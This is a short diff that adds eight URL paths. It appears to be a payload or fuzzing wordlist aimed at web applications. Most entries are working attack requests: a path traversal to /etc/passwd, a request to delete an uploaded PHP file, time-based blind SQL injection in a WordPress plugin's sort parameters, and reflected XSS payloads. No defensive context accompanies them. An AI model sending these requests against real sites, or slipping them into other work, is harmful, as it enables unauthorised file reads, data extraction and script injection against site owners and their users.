@@ -1,0 +1,8 @@
+/delete_img.php?img=./uploads/school_logos/1528_x1.php
+/img.php?f=/./etc/./passwd
+/ekrishta/index.php/login/sign-in
+/wp-admin/admin.php?page=wpgmp_manage_location&orderby=location_address&order=asc PROCEDURE ANALYSE(EXTRACTVALUE(4242,CONCAT(0x42,(BENCHMARK(42000000,MD5(0x42424242))))),42)
+/wp-admin/admin.php?page=wpgmp_manage_location&order=asc&orderby=location_address%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(555)))xxx)&order=asc
+/wp-admin/admin-ajax.php
+/cms/info.php?mod=list"</|\><plaintext/onmouseover=prompt(/XSS/)>
+/news.php?id=604""</|\><plaintext/onmouseover=prompt(/XSS/)>
